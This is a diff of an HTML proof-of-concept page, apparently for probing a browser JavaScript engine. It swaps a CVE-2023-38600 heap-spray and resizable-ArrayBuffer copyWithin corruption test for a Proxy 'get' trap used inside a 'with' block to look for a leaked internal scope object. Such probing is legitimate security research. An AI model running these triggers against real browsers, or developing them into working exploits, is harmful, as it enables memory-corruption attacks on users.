@@ -1,65 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2023-38600 - Enhanced Detection</title>
+    <title>ProxyObject Scope Leak PoC</title>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
         }
 
         window.onload = () => {
-            log("Starting enhanced CVE-2023-38600 test...");
+            log("Starting ProxyObject scope leak test...");
 
-            // Spray Float64Arrays to fill heap
-            const sprayCount = 1000;
-            let spray = [];
-            for (let i = 0; i < sprayCount; i++) {
-                spray.push(new Float64Array(4)); // Small but aligned size
-            }
+            // Dummy object to use in 'with' block
+            const base = {
+                foo() { return "original"; }
+            };
 
-            // Create a "watched" array whose length we will check
-            let watched = new Uint32Array(4);
-            watched[0] = 0x11223344;
-            log("Initial watched.length = " + watched.length);
+            // Proxy handler to capture 'this'
+            const handler = {
+                get(target, prop, receiver) {
+                    log("Proxy 'get' called");
+                    log("Receiver constructor: " + receiver?.constructor?.name);
+                    log("Receiver toString(): " + receiver?.toString());
 
-            // Evil object to resize mid-copyWithin
-            const evil = {
-                valueOf: () => {
-                    buffer.resize(8); // Resize during copyWithin
-                    return 0;
+                    // If receiver is a JSScope, we might be leaking internal pointer
+                    if (receiver && typeof receiver === "object") {
+                        try {
+                            // Try converting to string or inspecting properties
+                            log("Receiver hasOwnProperty('foo'): " + receiver.hasOwnProperty("foo"));
+                        } catch (e) {
+                            log("Error inspecting receiver: " + e.message);
+                        }
+                    }
+
+                    return target[prop];
                 }
             };
 
-            // Resizable ArrayBuffer
-            const buffer = new ArrayBuffer(16, { maxByteLength: 0x10000 });
-            const view = new Uint8Array(buffer);
+            const proxy = new Proxy(base, handler);
 
-            // Try multiple times to trigger bug
-            for (let i = 0; i < 10; i++) {
-                try {
-                    view.copyWithin(0, evil, 16);
-                    log(`Exploit run ${i+1} finished.`);
-                } catch (e) {
-                    log(`Exception at run ${i+1}: ${e.message}`);
-                    break;
+            // Run code inside 'with' block to trigger JSScope behavior
+            (function () {
+                with (proxy) {
+                    try {
+                        let result = foo(); // Should trigger Proxy 'get'
+                        log("foo() returned: " + result);
+                    } catch (e) {
+                        log("Exception in with-block: " + e.message);
+                    }
                 }
-            }
-
-            // Check if watched array was corrupted
-            if (watched.length !== 4) {
-                log("💥 Length was overwritten!");
-                log("New watched.length = " + watched.length);
-            } else {
-                log("No metadata corruption detected.");
-            }
-
-            // Optional: Dump first few values of watched buffer
-            log("watched[0] = " + watched[0].toString(16));
+            })();
         };
     </script>
 </head>
 <body>
-    <h2>CVE-2023-38600 Enhanced Test</h2>
-    <p>Testing memory corruption using heap spraying and metadata checks.</p>
+    <h2>ProxyObject Scope Leak Test</h2>
+    <p>Detecting potential JSScope leaks via Proxy traps.</p>
 </body>
 </html>
